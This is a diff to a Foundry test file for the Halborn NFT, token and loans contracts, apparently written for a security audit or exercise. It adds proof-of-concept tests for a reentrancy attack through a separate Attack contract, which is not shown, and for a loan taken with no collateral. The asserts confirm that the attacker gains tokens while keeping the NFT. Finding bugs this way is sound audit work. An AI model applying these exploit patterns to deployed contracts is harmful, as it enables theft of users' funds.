@@ -3,10 +3,10 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import {Merkle} from "./murky/Merkle.sol";
-
 import {HalbornNFT} from "../src/HalbornNFT.sol";
 import {HalbornToken} from "../src/HalbornToken.sol";
 import {HalbornLoans} from "../src/HalbornLoans.sol";
+import {Attack} from "src/Attack.sol";
 
 contract HalbornTest is Test {
     address public immutable ALICE = makeAddr("ALICE");
@@ -20,6 +20,7 @@ contract HalbornTest is Test {
     HalbornNFT public nft;
     HalbornToken public token;
     HalbornLoans public loans;
+    Attack public attack;
 
     function setUp() public {
         // Initialize
@@ -55,6 +56,8 @@ contract HalbornTest is Test {
         loans.initialize(address(token), address(nft));
 
         token.setLoans(address(loans));
+
+        attack = new Attack(address(loans), address(nft));
     }
 
     function testMintMulticall() public {
@@ -75,19 +78,49 @@ contract HalbornTest is Test {
     }
 
     function testUpdgrade() public {
-        vm.deal(ALICE, 1 ether);
-
-        bytes memory item = abi.encodeWithSignature(
-            "_upgradeToAndCallUUPS(address newimplementation)",
-            address(nft),
-            new bytes(0),
-            false
-        );
-        bytes[] memory data = new bytes[](1);
-        data[0] = item;
-
-        vm.prank(ALICE);
-        token.multicall{value: 1 ether}(data);
+        // Initialize
+        // Merkle m = new Merkle();
+        // // Test Data
+        // bytes32[] memory data = new bytes32[](4);
+        // data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
+        // data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
+        // data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
+        // data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));
+        // // Get Merkle Root
+        // bytes32 root = m.getRoot(data);
+        // // Get Proofs
+        // ALICE_PROOF_1 = m.getProof(data, 0);
+        // ALICE_PROOF_2 = m.getProof(data, 1);
+        // BOB_PROOF_1 = m.getProof(data, 2);
+        // BOB_PROOF_2 = m.getProof(data, 3);
+        // assertTrue(m.verifyProof(root, ALICE_PROOF_1, data[0]));
+        // assertTrue(m.verifyProof(root, ALICE_PROOF_2, data[1]));
+        // assertTrue(m.verifyProof(root, BOB_PROOF_1, data[2]));
+        // assertTrue(m.verifyProof(root, BOB_PROOF_2, data[3]));
+        // vm.deal(ALICE, 1 ether);
+        // HalbornNFT nft1;
+        // HalbornToken token1;
+        // nft1 = new HalbornNFT();
+        // nft1.initialize(root, 1 ether);
+        // token1 = new HalbornToken();
+        // token1.initialize();
+        // // console.log(proxy.implementation());
+        // bytes memory item = abi.encodeWithSignature(
+        //     "setLoans(address halbornLoans_)",
+        //     address(loans)
+        // );
+        // bytes[] memory data1 = new bytes[](1);
+        // data1[0] = item;
+        // // proxy._upgradeToAndCall(address(nft));
+        // // vm.prank(ALICE);
+        // // token.multicall(data);
+        // ERC1967Proxy proxy = new ERC1967Proxy(
+        //     address(token1),
+        //     abi.encodeWithSignature(
+        //         "setLoans(address halbornLoans_)",
+        //         address(loans)
+        //     )
+        // );
     }
 
     function testRevertMintAfterAirDrop() public {
@@ -126,7 +159,7 @@ contract HalbornTest is Test {
         vm.stopPrank();
     }
 
-    function testRevertGetLoan() public {
+    function testIncorrectCheckingCollateralInGetLoan() public {
         vm.deal(ALICE, 1 ether);
 
         vm.prank(ALICE);
@@ -152,5 +185,47 @@ contract HalbornTest is Test {
         vm.prank(ALICE);
         vm.expectRevert();
         loans.getLoan(1 ether);
+
+        assertEq(token.balanceOf(BOB), 0);
+        assertEq(loans.totalCollateral(BOB), 0);
+        assertEq(loans.usedCollateral(BOB), 0);
+        vm.prank(BOB);
+        loans.getLoan(10 ether);
+
+        assertEq(token.balanceOf(BOB), 10 ether);
+    }
+
+    function testReentrancyAttack() public {
+        vm.deal(ALICE, 1 ether);
+
+        //Buying NFT
+        vm.startPrank(ALICE);
+        nft.mintBuyWithETH{value: 1 ether}();
+        vm.stopPrank();
+
+        assertEq(ALICE, nft.ownerOf(1), "Alice is not the owner of token 1");
+
+        vm.prank(ALICE);
+        nft.safeTransferFrom(address(ALICE), address(attack), 1);
+
+        assertEq(token.balanceOf(address(attack)), 0);
+        assertEq(loans.usedCollateral(address(attack)), 0);
+        assertEq(
+            address(attack),
+            nft.ownerOf(1),
+            "Loans contract is not the owner of token 1"
+        );
+
+        attack.attack();
+
+        assertEq(token.balanceOf(address(attack)), 1 ether);
+
+        assertEq(loans.usedCollateral(address(attack)), 1 ether);
+
+        assertEq(
+            address(attack),
+            nft.ownerOf(1),
+            "Loans contract is not the owner of token 1"
+        );
     }
 }
